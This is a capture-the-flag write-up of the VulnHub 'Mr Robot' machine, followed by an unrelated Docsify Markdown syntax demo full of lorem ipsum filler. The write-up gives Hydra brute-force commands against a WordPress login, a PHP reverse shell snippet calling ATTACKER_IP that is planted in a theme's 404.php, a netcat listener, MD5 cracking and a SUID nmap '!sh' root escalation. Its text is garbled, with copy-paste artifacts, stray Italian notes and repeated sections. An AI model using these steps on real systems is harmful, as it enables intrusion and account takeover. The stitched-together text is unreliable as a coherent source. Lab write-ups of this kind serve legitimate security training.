# Attacking Mr Robot - VulnHub
![nmrrobot](images/mr-robot.jpg) 
## 1. Introduction
This write-up details the steps I took to solve the MR Robot vulnerable machine from VulnHub. The VM is inspired by the popular TV show "Mr. Robot" and contains three flags, each of increasing difficulty. The primary goal is to capture all three flags while demonstrating common hacking techniques such as brute-force attacks, hash cracking, and privilege escalation.

The demonstration was carried out individually, following several walkthroughs and guides found online (referenced at the end of this report).

**Threat Model:**  
In this scenario, the threat model assumes that the attacker is on the same local network as the MR Robot virtual machine.

## 2. Enviroment Configuration

### Tools:
- VirtualBox
- Mr-Robot 1 (Relese Date: 28 Jun 2016): Target Virtual Machine
- Kali Linux: Attacker Virtual Machine.
  - Nmap: Network scanning tool.
  - Dirb: Directory brute-forcing tool.
  - Hydra: Brute-forcing tool for login credentials.
  - John the Ripper: Password cracking tool.
  - PentestMonkey PHP Reverse Shell: For obtaining shell access.
  - Netcat: Networking utility for reverse shells.
  - Python: Used to spawn an interactive shell.


## Reconnaissance
### Gathering Information

The first step was to discover the target machine's IP address on the local network. I used netdiscover, a tool designed for ARP scanning, which helps identify live hosts within a subnet:

```
netdiscover -r 192.168.227.0/24
```

![netdiscover](images/netdiscover.png)  


This revealed the IP address of the MR Robot machine as 192.168.227.7. With this information, I proceeded with Nmap to identify the open ports and services running on the target:

```
nmap 192.168.227.7 -sV -T4 -oA nmap-scan -open
```

Output:
![nmap](images/nmap.png)
The scan revealed a web server running on port 80. I navigated to the web page to investigate further:

![webserver](images/webserver.png)

DIRB
Since the target was running a web server, the next logical step was to search for hidden directories that might reveal sensitive information. I used Dirb to perform a directory brute-force attack:
```
dirb http://192.168.227.7
```

Output:
![dirb-start](images/dirb-start.png)
![dirb-end](images/dirb-end.png)
The Dirb scan uncovered several directories, particularly ones related to WordPress, such as /wp-admin, confirming the target was running a WordPress CMS. Additionally, robots.txt was discovered, which is a common file used to instruct web crawlers about which parts of the website should not be indexed.

Navigating to the file ```http://192.168.227.7/robots.txt``` revealed some crucial information:
![1flag](images/1flag.png)

The dile fsocity.dic reveled to be a wordlist file containing a large number of words, which would later prove useful in brute-force attacks. The file
key-1-of-3.txt contains instead the first flag, marking the initial step in the challenge.

![1key](images/1key.png)


## Brute Force Attack
Once I discovered the WordPress site was running, I attempted to log in by navigating to http://192.168.227.7/wp-login.php. Without knowing the correct credentials, I used Burp Suite to intercept and analyze the HTTP POST requests sent when trying to log in with incorrect credentials.

![burp](images/burp.png)

By sending a fake username and password combination, I observed the error message returned by the server. The message clearly stated "Invalid username" when the username was incorrect, allowing me to focus the brute-force attack on discovering valid usernames first.

![usr](images/usr.png)

The error message and the structure of the HTTP POST request provided valuable insights for building the brute-force attack. The request included two key parameters: log for the username and pwd for the password. Using this information, I could systematically attempt different usernames while ignoring the password field for now.

Before proceeding with the brute-force attack, I first needed to filter the fsocity.dic wordlist. The file contained over 800,000 entries, but many of them were duplicates. To make the brute-force process more efficient, I removed the duplicates by using the following commands: 
```
sort fsocity.dic | uniq > fs-list
```
This reduced the wordlist from over 800,000 entries to just over 11,000 unique entries.

With the filtered fsocity.dic wordlist in hand, I proceeded to brute-force the login credentials for the WordPress admin panel. First, I needed to find a valid username by testing the wordlist using Hydra:

```
hydra -L fs-list -p test 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

![hydra1](images/hydra-1.png)

The brute force process successfully identified elliot as a valid username. 
I then attempted to brute-force elliot's password using the same fsocity.dic wordlist. This time, I used the "The password you entered for the username" error message to filter out incorrect passwords. 

![psw](images/psw.png)

I ran the following command:
```
hydra -l elliot -P fs-list 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```
![hydra2](images/hydra-2.png)

This revealed elliot's password: ER28-0652. With these credentials, I was able to log in to the WordPress admin panel.

## Exploitation
After successfully logging into the WordPress admin panel as elliot, I moved to the Appearance → Theme Editor section, which allows the administrator to edit theme files directly from the WordPress dashboard. One of the theme files available for editing was 404.php, a file that is responsible for handling 404 error pages (pages that do not exist).

### PHP Reverse Shell Injection:

To gain remote access to the target system, I decided to inject a PHP reverse shell into the 404.php template. This reverse shell script allows me to execute commands on the server remotely once triggered by visiting a non-existent page on the site.

The reverse shell script was obtained from PentestMonkey, a well-known and trusted source for penetration testing tools. 

I copied the raw PHP reverse shell code from the repository and replaced the content of 404.php with this script. Before injecting the code, I modified the following variables in the PHP script to match my attacking machine's IP address and a port of my choice:

$ip: Set to the IP address of my attacking machine.
$port: Set to 7777, the port I would use to listen for incoming connections.
This is the basic structure of the reverse shell code that was injected:

php
Copia codice
<?php
$ip = 'ATTACKER_IP';  // Replace with your IP address
$port = 7777;  // Replace with your chosen port number
$socket = fsockopen($ip, $port);
exec('/bin/sh -i <&3 >&3 2>&3');
?>
Triggering the Reverse Shell
Once the reverse shell was injected into 404.php, I triggered the payload by visiting a non-existent page on the target website (e.g., http://192.168.227.7/nonexistentpage). Since the 404.php file handles all requests for non-existent pages, this executed the reverse shell code.

Establishing a Reverse Shell with Netcat
To capture the reverse shell, I set up a Netcat listener on my attacking machine to wait for incoming connections. I used the following command to listen on port 7777:

bash
Copia codice
nc -lnvp 7777
-l: Tells Netcat to listen for incoming connections.
-n: Disables DNS resolution.
-v: Enables verbose mode.
-p 7777: Specifies the port on which to listen.
Netcat Listener Output: Once the PHP reverse shell was triggered by visiting the non-existent page, a connection was established, and I gained remote shell access to the target machine.

Exploring the File System
With shell access to the system, I began exploring the file system. After navigating to the /home/robot directory, I found two files of interest:

key-2-of-3.txt: This file contained the second flag, but I was unable to read it due to permission restrictions.
password.raw-md5: This file contained an MD5 hashed password, which I suspected belonged to the user robot.
At this point, I needed to escalate my privileges in order to read the second flag.



![php-404](images/php-404.png)

```
nc -lnvp 7777
```
![netcat](images/netcat.png)

dopo aver fatto partire la reverse shell, faccio un ls e vedo le cartelle, provo ad entrare in alcune ed entro in robot. trovandoci due files:
![ls](images/ls-to-robot.png)

la seconda chiave e un altro file. quando cerco di aprire il file, non mi lascia per privilegi. quindi cerco di aumentare i privilegi.


## Privilege Escalation
Capturing the Second Flag
Upon exploring the machine, I found two interesting files in the /home/robot directory:

key-2-of-3.txt: The second flag (unreadable by my current user).
password.raw-md5: An MD5-hashed password for the user robot.

I used John the Ripper to crack the hash:
```
john --format=raw-md5 password.raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

John the Ripper Output:
![ls](images/john.png)
```
password: abcdefghijklmnopqrstuvwxyz
```

I switched to the user robot using the cracked password:

``` 
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

ho lanciato una spawn shell con python  e sono riuscita ad ottenere la seconda chiave.


Once logged in as robot, I retrieved the second flag:
```
cat /home/robot/key-2-of-3.txt
```
![ls](images/py.png)


### Root Privilege Escalation
To escalate privileges to root, I searched for SUID binaries, which allow files to be executed with elevated privileges:

```
find / -perm -u=s -type f 2>/dev/null
```
![ls](images/find.png)

Among the results, I found Nmap with the SUID bit set. The version of Nmap installed on the system supported interactive mode, which allows commands to be executed as root.

```
nmap --interactive
!sh
```
![ls](images/nmap-interactive.png)

I spawned a root shell and captured the final flag:
```
cat /root/key-3-of-3.txt
```
![ls](images/root-3.png)

(images/cyber-security.jpg)

[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.

## Introduction


![The Markdown Mark](images/markdown-red.png)  
_Figure 1: The Markdown Mark_

Some of the key benefits are:

1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
2. Less chance of errors when writing in markdown.
3. Produces valid XHTML output.
4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
5. Write in any text editor or Markdown application you like.
6. Markdown is a joy to use!

John Gruber, the author of Markdown, puts it like this:

> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
> -- <cite>John Gruber</cite>


Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:

### Headings

Headings from `h1` through `h6` are constructed with a `#` for each level:

```markdown
# h1 Heading
## h2 Heading
### h3 Heading
#### h4 Heading
##### h5 Heading
###### h6 Heading
```

Renders to:

<h1> h1 Heading </h1>
<h2>  h2 Heading </h2>
<h3>  h3 Heading </h3>
<h4>  h4 Heading </h4>
<h5>  h5 Heading </h5>
<h6>  h6 Heading </h6>

HTML:

```html
<h1>h1 Heading</h1>
<h2>h2 Heading</h2>
<h3>h3 Heading</h3>
<h4>h4 Heading</h4>
<h5>h5 Heading</h5>
<h6>h6 Heading</h6>
```

### Comments

Comments should be HTML compatible

```html
<!--
This is a comment
-->
```
Comment below should **NOT** be seen:

<!--
This is a comment
-->

### Horizontal Rules

The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:

* `___`: three consecutive underscores
* `---`: three consecutive dashes
* `***`: three consecutive asterisks

renders to:

___

---

***


### Body Copy

Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.

So this body copy:

```markdown
Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
```
renders to this HTML:

```html
<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
```

### Emphasis

#### Bold
For emphasizing a snippet of text with a heavier font-weight.

The following snippet of text is **rendered as bold text**.

```markdown
**rendered as bold text**
```
renders to:

**rendered as bold text**

and this HTML

```html
<strong>rendered as bold text</strong>
```

#### Italics
For emphasizing a snippet of text with italics.

The following snippet of text is _rendered as italicized text_.

```markdown
_rendered as italicized text_
```

renders to:

_rendered as italicized text_

and this HTML:

```html
<em>rendered as italicized text</em>
```


#### strikethrough
In GFM (GitHub flavored Markdown) you can do strikethroughs.

```markdown
~~Strike through this text.~~
```
Which renders to:

~~Strike through this text.~~

HTML:

```html
<del>Strike through this text.</del>
```

### Blockquotes
For quoting blocks of content from another source within your document.

Add `>` before any text you want to quote.

```markdown
> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
```

Renders to:

> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.

and this HTML:

```html
<blockquote>
  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
</blockquote>
```

Blockquotes can also be nested:

```markdown
> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
>> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
```

Renders to:

> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
>> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.

### Lists

#### Unordered
A list of items in which the order of the items does not explicitly matter.

You may use any of the following symbols to denote bullets for each list item:

```markdown
* valid bullet
- valid bullet
+ valid bullet
```

For example

```markdown
+ Lorem ipsum dolor sit amet
+ Consectetur adipiscing elit
+ Integer molestie lorem at massa
+ Facilisis in pretium nisl aliquet
+ Nulla volutpat aliquam velit
  - Phasellus iaculis neque
  - Purus sodales ultricies
  - Vestibulum laoreet porttitor sem
  - Ac tristique libero volutpat at
+ Faucibus porta lacus fringilla vel
+ Aenean sit amet erat nunc
+ Eget porttitor lorem
```
Renders to:

+ Lorem ipsum dolor sit amet
+ Consectetur adipiscing elit
+ Integer molestie lorem at massa
+ Facilisis in pretium nisl aliquet
+ Nulla volutpat aliquam velit
  - Phasellus iaculis neque
  - Purus sodales ultricies
  - Vestibulum laoreet porttitor sem
  - Ac tristique libero volutpat at
+ Faucibus porta lacus fringilla vel
+ Aenean sit amet erat nunc
+ Eget porttitor lorem

And this HTML

```html
<ul>
  <li>Lorem ipsum dolor sit amet</li>
  <li>Consectetur adipiscing elit</li>
  <li>Integer molestie lorem at massa</li>
  <li>Facilisis in pretium nisl aliquet</li>
  <li>Nulla volutpat aliquam velit
    <ul>
      <li>Phasellus iaculis neque</li>
      <li>Purus sodales ultricies</li>
      <li>Vestibulum laoreet porttitor sem</li>
      <li>Ac tristique libero volutpat at</li>
    </ul>
  </li>
  <li>Faucibus porta lacus fringilla vel</li>
  <li>Aenean sit amet erat nunc</li>
  <li>Eget porttitor lorem</li>
</ul>
```

#### Ordered

A list of items in which the order of items does explicitly matter.

```markdown
1. Lorem ipsum dolor sit amet
2. Consectetur adipiscing elit
3. Integer molestie lorem at massa
4. Facilisis in pretium nisl aliquet
5. Nulla volutpat aliquam velit
6. Faucibus porta lacus fringilla vel
7. Aenean sit amet erat nunc
8. Eget porttitor lorem
```
Renders to:

1. Lorem ipsum dolor sit amet
2. Consectetur adipiscing elit
3. Integer molestie lorem at massa
4. Facilisis in pretium nisl aliquet
5. Nulla volutpat aliquam velit
6. Faucibus porta lacus fringilla vel
7. Aenean sit amet erat nunc
8. Eget porttitor lorem

And this HTML:

```html
<ol>
  <li>Lorem ipsum dolor sit amet</li>
  <li>Consectetur adipiscing elit</li>
  <li>Integer molestie lorem at massa</li>
  <li>Facilisis in pretium nisl aliquet</li>
  <li>Nulla volutpat aliquam velit</li>
  <li>Faucibus porta lacus fringilla vel</li>
  <li>Aenean sit amet erat nunc</li>
  <li>Eget porttitor lorem</li>
</ol>
```

**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:

```markdown
1. Lorem ipsum dolor sit amet
1. Consectetur adipiscing elit
1. Integer molestie lorem at massa
1. Facilisis in pretium nisl aliquet
1. Nulla volutpat aliquam velit
1. Faucibus porta lacus fringilla vel
1. Aenean sit amet erat nunc
1. Eget porttitor lorem
```

Renders to:

1. Lorem ipsum dolor sit amet
2. Consectetur adipiscing elit
3. Integer molestie lorem at massa
4. Facilisis in pretium nisl aliquet
5. Nulla volutpat aliquam velit
6. Faucibus porta lacus fringilla vel
7. Aenean sit amet erat nunc
8. Eget porttitor lorem

### Code

#### Inline code
Wrap inline snippets of code with `` ` ``.

```markdown
In this example, `<section></section>` should be wrapped as **code**.
```

Renders to:

In this example, `<section></section>` should be wrapped with **code**.

HTML:

```html
<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
```

#### Indented code

Or indent several lines of code by at least four spaces, as in:

<pre>
  // Some comments
  line 1 of code
  line 2 of code
  line 3 of code
</pre>

Renders to:

    // Some comments
    line 1 of code
    line 2 of code
    line 3 of code

HTML:

```html
<pre>
  <code>
    // Some comments
    line 1 of code
    line 2 of code
    line 3 of code
  </code>
</pre>
```


#### Block code "fences"

Use "fences"  ```` ``` ```` to block in multiple lines of code.

<pre>
``` markup
Sample text here...
```
</pre>


```
Sample text here...
```

HTML:

```html
<pre>
  <code>Sample text here...</code>
</pre>
```

#### Syntax highlighting

GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:

<pre>
```js
grunt.initConfig({
  assemble: {
    options: {
      assets: 'docs/assets',
      data: 'src/data/*.{json,yml}',
      helpers: 'src/custom-helpers.js',
      partials: ['src/partials/**/*.{hbs,md}']
    },
    pages: {
      options: {
        layout: 'default.hbs'
      },
      files: {
        './': ['src/templates/pages/index.hbs']
      }
    }
  }
};
```
</pre>

Renders to:

```js
grunt.initConfig({
  assemble: {
    options: {
      assets: 'docs/assets',
      data: 'src/data/*.{json,yml}',
      helpers: 'src/custom-helpers.js',
      partials: ['src/partials/**/*.{hbs,md}']
    },
    pages: {
      options: {
        layout: 'default.hbs'
      },
      files: {
        './': ['src/templates/pages/index.hbs']
      }
    }
  }
};
```

### Tables
Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.


```markdown
| Option | Description |
| ------ | ----------- |
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |
```

Renders to:

| Option | Description |
| ------ | ----------- |
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |

And this HTML:

```html
<table>
  <tr>
    <th>Option</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>data</td>
    <td>path to data files to supply the data that will be passed into templates.</td>
  </tr>
  <tr>
    <td>engine</td>
    <td>engine to be used for processing templates. Handlebars is the default.</td>
  </tr>
  <tr>
    <td>ext</td>
    <td>extension to be used for dest files.</td>
  </tr>
</table>
```

### Right aligned text

Adding a colon on the right side of the dashes below any heading will right align text for that column.

```markdown
| Option | Description |
| ------:| -----------:|
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |
```

| Option | Description |
| ------:| -----------:|
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |

### Links

#### Basic link

```markdown
[Assemble](http://assemble.io)
```

Renders to (hover over the link, there is no tooltip):

[Assemble](http://assemble.io)

HTML:

```html
<a href="http://assemble.io">Assemble</a>
```


#### Add a title

```markdown
[Upstage](https://github.com/upstage/ "Visit Upstage!")
```

Renders to (hover over the link, there should be a tooltip):

[Upstage](https://github.com/upstage/ "Visit Upstage!")

HTML:

```html
<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
```

#### Named Anchors

Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:

```markdown
# Table of Contents
  * [Chapter 1](#chapter-1)
  * [Chapter 2](#chapter-2)
  * [Chapter 3](#chapter-3)
```
will jump to these sections:

```markdown
### Chapter 1 <a id="chapter-1"></a>
Content for chapter one.

### Chapter 2 <a id="chapter-2"></a>
Content for chapter one.

### Chapter 3 <a id="chapter-3"></a>
Content for chapter one.
```
**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.

### Images
Images have a similar syntax to links but include a preceding exclamation point.

```markdown
![Image of Minion](https://octodex.github.com/images/minion.png)
```
![Image of Minion](https://octodex.github.com/images/minion.png)

and using a local image (which also displays in GitHub):

```markdown
![Image of Octocat](images/octocat.jpg)
```
![Image of Octocat](images/octocat.jpg)

## Topic One  

Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.

## Topic Two

Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
telum spectatorem at aequor.

## Topic Three

### Overview

Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
telum spectatorem at aequor.

### Subtopic One

Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
limenque per ferre graves causa neque credi epulasque isque celebravit pisces.

- Iasone filum nam rogat
- Effugere modo esse
- Comminus ecce nec manibus verba Persephonen taxo
- Viribus Mater
- Bello coeperunt viribus ultima fodiebant volentem spectat
- Pallae tempora

#### Fuit tela Caesareos tamen per balatum

De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
sceleris inquit operatus, abundet **excipit has**.

In locumque *perque* infelix hospite parente adducto aequora Ismarios,
feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
genero, virtus rite.

- Citius chlamydis saepe colorem paludosa territaque amoris
- Hippolytus interdum
- Ego uterque tibi canis
- Tamen arbore trepidosque

#### Colit potiora ungues plumeus de glomerari num

Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
**est aevi** esse riget agmenque nutrit fugacis.

- Coortis vox Pylius namque herbosas tuae excedere
- Tellus terribilem saetae Echinadas arbore digna
- Erraverit lectusque teste fecerat

Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.

### Subtopic Two

Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
contingat militis concitus, ad!

#### Et omnis blanda fetum ortum levatus altoque

Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
*hectora candidus*!

#### Et hanc

Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
nitidique! Ignavo tibi in perdam, est tu precantia fuerat
[revelli](http://jaspervdj.be/).

Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
plus *cum ignes nondum*, fata sum arcus lustraverat tantis!

#### Adulterium tamen instantiaque puniceum et formae patitur

Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
cacumine dei malum solus.

1. Mansit post ambrosiae terras
2. Est habet formidatis grandior promissa femur nympharum
3. Maestae flumina
4. Sit more Trinacris vitasset tergo domoque
5. Anxia tota tria
6. Est quo faece nostri in fretum gurgite

Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
ignescere eburno e decolor terga.

> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
